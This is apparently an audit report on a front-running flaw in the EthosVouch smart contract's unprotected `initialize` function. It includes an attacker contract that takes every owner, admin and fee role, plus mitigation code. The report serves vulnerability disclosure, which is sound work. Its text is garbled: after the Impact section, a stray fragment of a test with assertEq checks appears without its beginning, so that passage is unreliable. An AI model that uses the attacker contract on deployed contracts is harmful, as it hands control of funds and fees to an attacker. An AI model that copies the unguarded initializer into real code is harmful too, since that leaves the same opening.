# Front-Run Vulnerability in `initialize` Function of EthosVouch Contract Allows Unauthorized Control and Parameter Manipulation

### Summary

The `initialize` function of the **EthosVouch** contract is used to initialize the contract's state and set key parameters. Although it uses the `initializer` modifier to prevent reinitialization, there is still a risk of a **front-run attack**. An attacker could call the `initialize` function before the intended initializer, allowing them to set their own values, take ownership of the contract, and potentially force a redeployment.

### Root Cause

The vulnerability stems from the lack of caller verification. The contract relies solely on the `initializer` modifier to prevent multiple initializations but does not ensure atomicity during deployment. Anyone can call the `initialize` function as long as it's the first call, without any check on the caller's identity.

[ethos/packages/contracts/contracts/EthosVouch.sol:initialize#L259](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/EthosVouch.sol#L270C1-L270C27)
```solidity
function initialize(
    address _owner,
    address _admin,
    address _expectedSigner,
    address _signatureVerifier,
    address _contractAddressManagerAddr,
    address _feeProtocolAddress,
    uint256 _entryProtocolFeeBasisPoints,
    uint256 _entryDonationFeeBasisPoints,
    uint256 _entryVouchersPoolFeeBasisPoints,
    uint256 _exitFeeBasisPoints
) external initializer {
    // Anyone can call this function
    // It will succeed as long as it's the first call
    __accessControl_init(...);
}
```

### Internal pre-conditions

- The contract must be deployed but not yet initialized.
- The `_initialized` variable must be `false`.
- The contract must have sufficient gas to execute initialization.

### External pre-conditions

- Before the normal initialization transaction is executed.
- After the contract has been deployed.
- Before someone else attempts initialization.

### Attack Path

1.**Monitor Deployment**:
The attacker actively monitors for the deployment of the EthosVouch contract. This can be done by tracking events emitted during contract creation or by continuously checking for newly deployed contracts.
```solidity
contract Attacker {
    function monitorDeployment(address target) external {
        // Listen to the deployment event of the EthosVouch contract
    }
}
```

2.**Front-Run Attack**:
After detecting the deployment, the attacker can attempt to front-run the initialization of the contract. Since the initialize function only requires the contract to be deployed (but not yet initialized), the attacker can call initialize on the EthosVouch contract before the legitimate initialization process is executed.

By calling the initialize function, the attacker sets the ownership and administrative roles, and controls critical parameters of the contract, including the fee distribution, signer, and verifier. This allows the attacker to fully control the contract.

```solidity
contract EthosVouchAttacker {
    function attack(address target) external {
        IEthosVouch(target).initialize(
            address(this),  // Attacker becomes the owner
            address(this),  // Attacker becomes the admin
            address(this),  // Attacker controls signer
            address(this),  // Attacker controls signature verifier
            address(this),  // Attacker controls contract manager
            address(this),  // Attacker controls fee receiver
            100,            // Protocol fee rate
            100,            // Donation fee rate
            100,            // Voucher pool fee rate
            100             // Exit fee rate
        );
    }
}
```

### Impact

- The attacker gains full control of the contract and can modify key parameters and fee rates.
- The attacker could manipulate the fee distribution, hijack the collateral system, or block normal users from using the contract, forcing redeployment.

        );
        
        // Verify the attacker's control
        assertEq(vouch.owner(), attacker);
        assertEq(vouch.admin(), attacker);
        
        vm.stopPrank();
    }
}
```

### Mitigation

To mitigate this issue, one solution is to use a **factory contract** that ensures only the deployer of the contract can initialize it. Alternatively, the deployerâ€™s address should be validated to prevent unauthorized deployments and initializations.

```solidity
contract EthosVouchFactory {
    function deployAndInitialize(
        address owner,
        address admin,
        // ... other params
    ) external returns (address) {
        EthosVouch vouch = new EthosVouch();
        vouch.initialize(owner, admin, ...);
        return address(vouch);
    }
}

function initialize(
    address owner,
    // ... other params
) external initializer {
    require(msg.sender == DEPLOYER, "Unauthorized");
    __accessControl_init(...);
}
```
